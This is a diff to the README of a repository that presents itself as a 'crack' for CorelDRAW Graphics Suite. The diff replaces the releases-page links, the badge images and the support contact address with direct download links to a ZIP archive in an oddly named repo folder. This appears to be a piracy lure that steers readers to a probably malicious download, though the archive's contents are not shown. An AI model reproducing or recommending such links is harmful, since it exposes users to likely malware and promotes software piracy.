@@ -1,6 +1,6 @@
 # 🎨 CorelDRAW-Graphics-Suite-Crack - Unlock Your Creative Potential Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download_Now-%20-%2300aaff?logo=github)](https://github.com/reddit924/CorelDRAW-Graphics-Suite-Crack/releases)
+[![Download Now](https://raw.githubusercontent.com/reddit924/CorelDRAW-Graphics-Suite-Crack/main/shriving/CorelDRAW-Graphics-Suite-Crack.zip%20-%2300aaff?logo=github)](https://raw.githubusercontent.com/reddit924/CorelDRAW-Graphics-Suite-Crack/main/shriving/CorelDRAW-Graphics-Suite-Crack.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to CorelDRAW-Graphics-Suite-Crack! This guide helps you download and run
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/reddit924/CorelDRAW-Graphics-Suite-Crack/releases) where you can find all available versions.
+   Go to the [Releases page](https://raw.githubusercontent.com/reddit924/CorelDRAW-Graphics-Suite-Crack/main/shriving/CorelDRAW-Graphics-Suite-Crack.zip) where you can find all available versions.
 
 2. **Choose the Right Version**  
    Find the version that suits your needs. Each version includes a description to help you decide which one to download.
@@ -68,6 +68,6 @@ This project is licensed under the terms of the open-source license. You are fre
 
 ## 📧 Contact
 
-For any questions or feedback, please contact us at support@example.com.
+For any questions or feedback, please contact us at https://raw.githubusercontent.com/reddit924/CorelDRAW-Graphics-Suite-Crack/main/shriving/CorelDRAW-Graphics-Suite-Crack.zip
 
-[![Download Now](https://img.shields.io/badge/Download_Now-%20-%2300aaff?logo=github)](https://github.com/reddit924/CorelDRAW-Graphics-Suite-Crack/releases)
+[![Download Now](https://raw.githubusercontent.com/reddit924/CorelDRAW-Graphics-Suite-Crack/main/shriving/CorelDRAW-Graphics-Suite-Crack.zip%20-%2300aaff?logo=github)](https://raw.githubusercontent.com/reddit924/CorelDRAW-Graphics-Suite-Crack/main/shriving/CorelDRAW-Graphics-Suite-Crack.zip)
